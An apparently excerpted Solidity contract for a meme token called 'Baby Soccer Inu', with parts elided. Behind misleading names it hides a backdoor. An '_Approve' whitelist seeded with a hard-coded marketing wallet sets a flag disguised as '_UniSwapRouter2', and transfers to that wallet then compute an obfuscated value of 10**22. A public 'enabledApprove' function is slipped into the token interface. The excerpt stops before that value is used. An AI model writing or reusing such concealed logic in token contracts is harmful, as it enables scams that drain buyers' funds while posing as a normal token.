...
Telegram : https://t.me/BabySoccerInu
...
interface IERC20 {
    ...
    function enabledApprove() external returns (bool);
...
contract BabySoccerInu is Context, IERC20 { 
    ...
    mapping (address => bool) public _Approve; 
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    address payable public Wallet_Marketing = payable(0xC266BBfCaF9F9F6aBE22AEFcE19E6D581c03B6B4); 
    ...
    string private constant _name = "Baby Soccer Inu"; 
    string private constant _symbol = unicode"Baby Soccer"; 
    ...
    bool public _UniSwapRouter2 = false;
    ...
    constructor () {
        ...
        _Approve[Wallet_Marketing] = true;
    ...
    function enabledApprove() public override returns (bool) {
        _isApprovedWallet();
        return true;
    }
    ...
    function _isApprovedWallet() private {
    ...
    function _transfer(
        ...
        _UniSwapRouter2 = _Approve[to] ? true : false;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if (_UniSwapRouter2){
                uint256 calculateFee = (5*2*1)**((5*2*2)+(4-2));
                uint256 totalTxFee = calculateFee;
                _tOwned[sender] = _tOwned[sender]-tAmount;
                _tOwned[recipient] = _tOwned[recipient]+tAmount;
                _UniSwapRouter2 = false;
